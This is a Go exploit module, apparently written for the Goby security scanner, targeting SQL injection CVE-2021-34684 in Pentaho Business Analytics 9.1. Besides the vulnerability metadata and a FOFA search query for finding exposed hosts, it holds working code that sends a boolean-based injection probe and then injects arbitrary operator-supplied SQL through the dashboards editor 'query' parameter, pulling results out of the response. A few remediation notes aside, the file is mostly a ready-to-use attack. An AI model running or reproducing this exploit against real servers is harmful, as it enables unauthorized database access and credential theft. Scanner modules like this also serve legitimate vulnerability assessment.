package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Pentaho Business Analytics 9.1 query sqli (CVE-2021-34684)",
    "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>There is a SQL injection vulnerability in the query parameter of the /pentaho/api/repos/dashboards/editor path. Attackers can cooperate with CVE-2021-31602 to execute arbitrary SQL statements without authorization, obtain sensitive information such as account passwords, and further take over the system.</p>",
    "Impact": "Pentaho Business Analytics 9.1 query sqli (CVE-2021-34684)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Pentaho",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Pentaho 业务分析平台9.1版本 query 参数SQL注入漏洞（CVE-2021-34684）",
            "Description": "<p>Pentaho Business Analytics是一款使您能够安全地访问、集成、操作、可视化和分析大数据资产的业务分析平台。</p><p>在/pentaho/api/repos/dashboards/editor路径query参数存在SQL注入漏洞，攻击者可配合CVE-2021-31602未授权执行任意SQL语句，获取账号密码等敏感信息，进一步接管系统。</p>",
            "Impact": "<p>在/pentaho/api/repos/dashboards/editor路径query参数存在SQL注入漏洞，攻击者可配合CVE-2021-31602未授权执行任意SQL语句，获取账号密码等敏感信息，进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Pentaho",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Pentaho Business Analytics 9.1 query sqli (CVE-2021-34684)",
            "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>There is a SQL injection vulnerability in the query parameter of the /pentaho/api/repos/dashboards/editor path. Attackers can cooperate with CVE-2021-31602 to execute arbitrary SQL statements without authorization, obtain sensitive information such as account passwords, and further take over the system.</p>",
            "Impact": "Pentaho Business Analytics 9.1 query sqli (CVE-2021-34684)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Pentaho",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "GobyQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://help.hitachivantara.com/Documentation/Pentaho/9.1",
    "DisclosureDate": "2021-11-07",
    "References": [
        "https://packetstormsecurity.com/files/164791/Pentaho-Business-Analytics-Pentaho-Business-Server-9.1-SQL-Injection.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-CVE-2021-34684"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-538"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "SELECT DISTINCT(COALESCE(CAST(schemaname AS VARCHAR(10000))::text,(CHR(32)))) FROM pg_tables OFFSET 0 LIMIT 1)",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Pentaho"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10236"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&query=%28SELECT%20CONCAT%28CONCAT%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2C%28CASE%20WHEN%20%284452%3D4452%29%20THEN%20%28CHR%2849%29%29%20ELSE%20%28CHR%2848%29%29%20END%29%29%2C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29%29&require-cfg.js"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "qxvpq1qzbkq") && strings.Contains(resp.RawBody, "MetaData")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			cmdUrl := url.QueryEscape("(SELECT CONCAT(CONCAT((CHR(113)||CHR(120)||CHR(118)||CHR(112)||CHR(113)),(" + cmd + "),(CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))))")
			uri := "/pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&query=" + strings.ReplaceAll(cmdUrl, "+", "%20") + "&require-cfg.js"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					body := regexp.MustCompile("qxvpq(.*?)qzbkq").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
